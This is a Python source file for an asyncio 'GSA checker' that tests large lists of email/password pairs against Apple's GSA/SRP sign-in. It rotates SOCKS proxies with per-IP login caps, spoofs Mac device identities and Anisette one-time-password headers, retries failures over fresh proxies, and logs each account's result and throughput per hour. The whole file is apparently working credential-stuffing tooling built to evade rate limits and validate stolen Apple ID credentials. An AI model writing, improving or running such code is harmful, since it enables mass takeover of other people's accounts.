#!/usr/bin/env python3
"""Coroutine GSA runner.

Hot-path Apple requests use aiohttp/aiohttp-socks.  A small executor is kept
only for native SRP and the legacy device/Anisette bootstrap APIs; account
concurrency is represented by asyncio tasks, not one OS thread per account.
"""
from __future__ import annotations

import argparse
import asyncio
import collections
import concurrent.futures
import json
import os
import random
import signal
import statistics
import sys
import threading
import time

from simple import (device_profile, load_accounts, local_exception_result,
                    proxy_api_default, refine_status, retry_kind)


def parser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(description="asyncio GSA checker")
    ap.add_argument('--accounts', required=True)
    ap.add_argument('--api', default=proxy_api_default())
    ap.add_argument('--device-root', default='./data/devices-simple')
    ap.add_argument('--threads', type=int, default=200,
                    help='兼容旧参数：现在表示每进程并发协程数')
    ap.add_argument('--limit', type=int, default=0)
    ap.add_argument('--offset', type=int, default=0)
    ap.add_argument('--slot-base', type=int, default=0, dest='slot_base')
    ap.add_argument('--timeout', type=float, default=10.0)
    ap.add_argument('--retries', type=int, default=0)
    ap.add_argument('--retry', type=int, default=2)
    ap.add_argument('--item-timeout', type=float, default=20.0, dest='item_timeout')
    ap.add_argument('--no-register', action='store_true')
    ap.add_argument('--register-timeout', type=float, default=20.0, dest='register_timeout')
    ap.add_argument('--anisette-timeout', type=float, default=30.0, dest='anisette_timeout')
    ap.add_argument('--anisette-workers', type=int, default=0, dest='anisette_workers')
    ap.add_argument('--anisette-proxy', action='store_true', dest='anisette_proxy')
    ap.add_argument('--verify-web', action='store_true', dest='verify_web')
    ap.add_argument('--per-ip', type=int, default=6, dest='per_ip')
    ap.add_argument('--otp-reuse', type=int, default=15, dest='otp_reuse')
    ap.add_argument('--ip-ttl', type=float, default=50.0, dest='ip_ttl')
    ap.add_argument('--ip-batch', type=int, default=1000, dest='ip_batch')
    ap.add_argument('--ip-interval', type=float, default=3.0, dest='ip_interval')
    ap.add_argument('--out', default='./data/simple-run.jsonl')
    ap.add_argument('--live', default='./data/live.json')
    return ap


def _mock_identity() -> dict:
    return {
        'X-Apple-I-MD': 'mock', 'X-Apple-I-MD-M': 'mock',
        'X-Apple-I-MD-LU': 'mock', 'X-Apple-I-MD-RINFO': '17106176',
        'X-Mme-Device-Id': '00000000-0000-0000-0000-000000000000',
        'X-MMe-Client-Info': '<MacBookPro18,1> <macOS;14.0;23A344>',
        'User-Agent': 'akd/1.0',
    }


def _attempt_slice(remaining: float, retries: int, attempt: int) -> float:
    """Share the remaining item budget fairly across the attempts left.

    The old ``remaining / 2`` rule produced a 10s -> 5s -> 2.5s staircase for
    a 20-second item budget.  A third proxy therefore received less time than
    a healthy GSA round trip normally needs.  Equal slices preserve the same
    hard per-item deadline while giving every configured proxy attempt a real
    chance to complete.
    """
    total_attempts = max(1, int(retries) + 1)
    attempts_left = max(1, total_attempts - int(attempt) + 1)
    return max(1.0, float(remaining) / attempts_left)


async def run(args) -> int:
    from fastcheck.devices import DevicePool, count_registered_devices
    from fastcheck.protocols import gsa_async as gs
    from fastcheck.protocols.srp_auth import SRP_MATH_BACKEND
    from fastcheck.status import result_bucket
    from gsafast.ippool import IpPool

    gs.require_available()
    full = load_accounts(args.accounts, 0)
    start_at = max(0, args.offset)
    rows = full[start_at:start_at + args.limit] if args.limit else full[start_at:]
    concurrency = max(1, min(args.threads, len(rows) or 1))
    mock = os.environ.get('FASTCHECK_MOCK') == '1'
    os.makedirs(os.path.dirname(args.out) or '.', exist_ok=True)
    os.makedirs(os.path.dirname(args.live) or '.', exist_ok=True)

    # CPU work stays bounded near core count.  Blocking device bootstrap has a
    # separate executor so it cannot starve SRP while many slots initialise.
    loop = asyncio.get_running_loop()
    cpu_workers = max(2, min(8, os.cpu_count() or 4))
    cpu_pool = concurrent.futures.ThreadPoolExecutor(
        max_workers=cpu_workers, thread_name_prefix='srp')
    io_pool = concurrent.futures.ThreadPoolExecutor(
        max_workers=min(64, concurrency), thread_name_prefix='device-io')
    loop.set_default_executor(cpu_pool)

    ip_pool = None
    if not mock:
        if not args.api or '{num}' not in args.api:
            raise SystemExit('没有代理接口：设置 GSA_PROXY_API 或 secrets.json')
        ip_pool = IpPool(args.api, threads=concurrency, ttl=args.ip_ttl,
                         per_ip=args.per_ip, batch=args.ip_batch,
                         refill_interval=args.ip_interval)
        warmed = await loop.run_in_executor(io_pool, ip_pool.warm, 1)
        ip_pool.start()
        print(f'异步 IP 池预热 {warmed} 条')

    queue = asyncio.Queue()
    for row in rows:
        queue.put_nowait(row)
    stop = asyncio.Event()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, stop.set)
        except (NotImplementedError, RuntimeError):
            pass

    started = time.perf_counter()
    wall_started = time.time()
    proc_cpu0 = time.process_time()
    state = {
        'done': 0, 'by_status': {}, 'recent': collections.deque(maxlen=12),
        'samples': [], 'retried': 0, 'by_retry': {}, 'budget_hit': 0,
        'otp_hit': 0, 'otp_fetch': 0, 'ip_fail': 0,
        'device_in_use': set(), 'device_registering': set(),
        'register_errors': 0, 'register_error_types': {}, 'worker_errors': [],
    }
    sink = open(args.out, 'w', encoding='utf-8')
    write_buffer: list[str] = []
    anisette_limit = args.anisette_workers or concurrency
    anisette_gate = asyncio.Semaphore(max(1, anisette_limit))
    register_gate = asyncio.Semaphore(min(64, concurrency))

    async def acquire_ip(tid: int, wait: float = 60.0):
        if mock:
            return 'socks5://127.0.0.1:9', time.monotonic() + 3600
        deadline = time.monotonic() + wait
        while not stop.is_set() and time.monotonic() < deadline:
            proxy, expires = ip_pool.acquire_nowait(tid)
            if proxy:
                return proxy, expires
            await asyncio.sleep(0.1 + random.random() * 0.1)
        state['ip_fail'] += 1
        return None, 0.0

    def prepare_slot_sync(tid: int, route: str | None):
        if mock:
            return {'pool': None, 'info': _mock_identity(), 'profile': None,
                    'slot': args.slot_base + tid + 1}
        slot = args.slot_base + tid + 1
        pool = DevicePool(args.device_root, 'https://new.ani.sidestore.io',
                          max_devices=args.slot_base + concurrency)
        profile = device_profile(pool, slot)
        info = pool.info(max(args.timeout, 20),
                         proxy=route if args.anisette_proxy else None,
                         provider_direct=not args.anisette_proxy)
        info = dict(info, client_info=profile['client_info'],
                    user_agent=profile['user_agent'])
        ready = pool.inspect(slot).get('state') == 'ready'
        if not args.no_register and not ready:
            pool.fetch_headers(
                slot, info, max(1.0, args.register_timeout), registered=False,
                proxy=route if args.anisette_proxy else None,
                provider_direct=not args.anisette_proxy)
        return {'pool': pool, 'info': info, 'profile': profile, 'slot': slot}

    def fetch_otp_sync(context, route):
        if mock:
            return _mock_identity()
        raw = context['pool'].fetch_headers(
            context['slot'], context['info'], max(args.timeout, 20), registered=True,
            proxy=route if args.anisette_proxy else None,
            provider_direct=not args.anisette_proxy)
        profile = context['profile']
        if profile and isinstance(raw, dict):
            raw = dict(raw)
            raw['X-MMe-Client-Info'] = profile['client_info']
            raw['X-Mme-Client-Info'] = profile['client_info']
            raw.setdefault('User-Agent', profile['user_agent'])
        return raw

    async def prepare_slot(tid, route):
        slot = args.slot_base + tid + 1
        state['device_registering'].add(slot)
        try:
            async with register_gate:
                return await loop.run_in_executor(io_pool, prepare_slot_sync, tid, route)
        finally:
            state['device_registering'].discard(slot)

    async def fetch_otp(context, route):
        async with anisette_gate:
            return await loop.run_in_executor(io_pool, fetch_otp_sync, context, route)

    def record(row):
        state['done'] += 1
        final = row['final']
        state['by_status'][final] = state['by_status'].get(final, 0) + 1
        if row['attempts'] > 1:
            state['retried'] += 1
            reason = row.get('retry_reason') or '?'
            state['by_retry'][reason] = state['by_retry'].get(reason, 0) + 1
        if row.get('budget_hit'):
            state['budget_hit'] += 1
        if state['done'] % 10 == 0:
            state['samples'].append(row)
            if len(state['samples']) > 4000:
                del state['samples'][:-4000]
        state['recent'].append(row)
        write_buffer.append(json.dumps(row, ensure_ascii=False))
        if len(write_buffer) >= 200:
            sink.write('\n'.join(write_buffer) + '\n')
            sink.flush()
            write_buffer.clear()

    async def worker(tid: int):
        slot = args.slot_base + tid + 1
        route = expires = None
        transport = None
        context = None
        cached_otp = None
        otp_used = 0
        try:
            route, expires = await acquire_ip(tid)
            if not route:
                return
            while context is None and not stop.is_set():
                try:
                    context = await prepare_slot(tid, route)
                except Exception as exc:  # noqa: BLE001
                    state['register_errors'] += 1
                    name = type(exc).__name__
                    state['register_error_types'][name] = state['register_error_types'].get(name, 0) + 1
                    if ip_pool:
                        ip_pool.release(tid, route, expires, healthy=False)
                    route, expires = await acquire_ip(tid, 20)
                    if not route:
                        await asyncio.sleep(0.5)
            if context is None:
                return
            state['device_in_use'].add(slot)
            served = 0
            transport = gs.AsyncGsaSession(route)
            await transport.open()
            while not stop.is_set():
                if (not route or served >= args.per_ip
                        or (expires and expires <= time.monotonic())):
                    await transport.close()
                    if ip_pool and route:
                        ip_pool.release(tid, route, expires, healthy=served > 0)
                    route, expires = await acquire_ip(tid)
                    if not route:
                        await asyncio.sleep(0.5)
                        continue
                    transport = gs.AsyncGsaSession(route)
                    await transport.open()
                    served = 0
                try:
                    email, password = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                t0 = time.perf_counter()
                attempts = 0
                retry_reason = ''
                budget_hit = False
                result = None
                try:
                    if cached_otp is None or args.otp_reuse <= 0 or otp_used >= args.otp_reuse:
                        cached_otp = await fetch_otp(context, route)
                        otp_used = 0
                        state['otp_fetch'] += 1
                    else:
                        state['otp_hit'] += 1
                    otp_used += 1
                    deadline = t0 + max(1.0, args.item_timeout)
                    while True:
                        attempts += 1
                        remaining = deadline - time.perf_counter()
                        if remaining < 1.0:
                            result = {'status': 'timeout', 'kind': 'budget',
                                      'detail': '单条预算耗尽', 'http': 0}
                            retry_reason = 'budget'
                            budget_hit = True
                            break
                        attempt_budget = _attempt_slice(
                            remaining, args.retry, attempts)
                        try:
                            result = await asyncio.wait_for(
                                gs.check(email, password, route,
                                         timeout=max(2.0, min(args.timeout,
                                                              attempt_budget)),
                                         retries=args.retries, identity=cached_otp,
                                         session=transport),
                                timeout=attempt_budget)
                        except asyncio.TimeoutError:
                            result = {'status': 'timeout', 'kind': 'timeout',
                                      'detail': '本次代理连接超时', 'http': 0}
                        status = refine_status(result, result_bucket(result))
                        kind, why = retry_kind(result, status)
                        if kind is None or attempts > args.retry:
                            retry_reason = why if attempts > 1 else ''
                            break
                        retry_reason = why
                        await transport.close()
                        if ip_pool:
                            ip_pool.release(tid, route, expires, healthy=False)
                        route, expires = await acquire_ip(tid, 20)
                        if not route:
                            break
                        transport = gs.AsyncGsaSession(route)
                        await transport.open()
                        if str(kind) == 'env':
                            cached_otp = await fetch_otp(context, route)
                            otp_used = 1
                except Exception as exc:  # noqa: BLE001
                    result = local_exception_result(exc)
                elapsed = (time.perf_counter() - t0) * 1000
                result = result or {'status': 'error', 'detail': 'no result'}
                raw_status = str(result.get('status') or 'error')
                final = refine_status(result, result_bucket(result))
                row = {
                    'tid': tid, 'slot': slot, 'email': email,
                    'raw_status': raw_status, 'status': final, 'final': final,
                    'ec': result.get('apple_ec'),
                    'detail': str(result.get('apple_message') or result.get('detail') or '')[:160],
                    'http': result.get('http'), 'ms': round(elapsed, 1),
                    'thread_cpu_ms': 0.0, 'attempts': attempts,
                    'retry_reason': retry_reason, 'budget_hit': budget_hit,
                }
                record(row)
                queue.task_done()
                served += 1
        except BaseException as exc:  # noqa: BLE001
            state['worker_errors'].append(f'{type(exc).__name__}: {exc}')
        finally:
            state['device_in_use'].discard(slot)
            state['device_registering'].discard(slot)
            if transport is not None:
                await transport.close()
            if ip_pool and route:
                ip_pool.release(tid, route, expires, healthy=True)

    async def make_payload(final=False):
        elapsed = max(0.001, time.perf_counter() - started)
        cpu = time.process_time() - proc_cpu0
        samples = state['samples']
        values = sorted(row['ms'] for row in samples)
        p50 = round(statistics.median(values)) if values else None
        p90 = values[int(len(values) * .9)] if values else None
        registered = (0 if mock else await loop.run_in_executor(
            io_pool, count_registered_devices, args.device_root,
            'https://new.ani.sidestore.io'))
        done = state['done']
        payload = {
            'started': time.strftime('%H:%M:%S', time.localtime(wall_started)),
            'elapsed': round(elapsed, 1), 'total': len(rows), 'done': done,
            'rate': round(done / elapsed, 2), 'per_hour': round(done / elapsed * 3600),
            'eta': round((len(rows) - done) / (done / elapsed), 0) if done else None,
            'threads': concurrency, 'processes': 1, 'engine': 'asyncio',
            'backend': SRP_MATH_BACKEND, 'accounts': args.accounts,
            'cpu_seconds': round(cpu, 2), 'cpu_cores': round(cpu / elapsed, 3),
            'cpu_per_account': round(cpu / done * 1000, 1) if done else 0,
            'proc_cpu_seconds': round(cpu, 2), 'proc_cpu_cores': round(cpu / elapsed, 3),
            'ip_fail': state['ip_fail'],
            'ip_pool': ip_pool.snapshot() if ip_pool else {},
            'retried': state['retried'], 'by_retry': dict(state['by_retry']),
            'budget_hit': state['budget_hit'], 'otp_hit': state['otp_hit'],
            'otp_fetch': state['otp_fetch'], 'by_status': dict(state['by_status']),
            'p50': p50, 'p90': p90, 'recent': list(state['recent']),
            'device_ready': registered, 'device_registered': registered,
            'device_in_use': len(state['device_in_use']),
            'device_registering': len(state['device_registering']),
            'register_errors': state['register_errors'],
            'register_error_types': dict(state['register_error_types']),
            'worker_errors': list(state['worker_errors'][-8:]),
            'runtime_threads': threading.active_count(),
            'finished': bool(final and done == len(rows)),
            'status': 'complete' if final and done == len(rows) else 'running',
            'incomplete': max(0, len(rows) - done) if final else 0,
        }
        return payload

    async def live_writer():
        while not stop.is_set():
            payload = await make_payload(False)
            tmp = args.live + '.tmp'
            with open(tmp, 'w', encoding='utf-8') as handle:
                json.dump(payload, handle, ensure_ascii=False)
            os.replace(tmp, args.live)
            await asyncio.sleep(1)

    print(f'账号 {len(rows)} 条 | asyncio 协程 {concurrency} | '
          f'CPU executor {cpu_workers} | SRP {SRP_MATH_BACKEND}')
    writer_task = asyncio.create_task(live_writer(), name='live-writer')
    workers = [asyncio.create_task(worker(tid), name=f'worker-{tid}')
               for tid in range(concurrency)]
    await asyncio.gather(*workers)
    stop.set()
    writer_task.cancel()
    await asyncio.gather(writer_task, return_exceptions=True)
    if write_buffer:
        sink.write('\n'.join(write_buffer) + '\n')
    sink.close()
    payload = await make_payload(True)
    tmp = args.live + '.tmp'
    with open(tmp, 'w', encoding='utf-8') as handle:
        json.dump(payload, handle, ensure_ascii=False)
    os.replace(tmp, args.live)
    if ip_pool:
        await loop.run_in_executor(io_pool, ip_pool.stop)
    io_pool.shutdown(wait=True, cancel_futures=True)
    cpu_pool.shutdown(wait=True, cancel_futures=True)
    print(f"完成 {payload['done']}/{payload['total']} | {payload['rate']} 条/秒 | "
          f"{payload['per_hour']/10000:.1f} 万/小时 | CPU {payload['cpu_cores']} 核")
    if payload['worker_errors']:
        print('worker errors:', payload['worker_errors'])
    return 0 if payload['finished'] else 2


def main() -> int:
    return asyncio.run(run(parser().parse_args()))


if __name__ == '__main__':
    raise SystemExit(main())
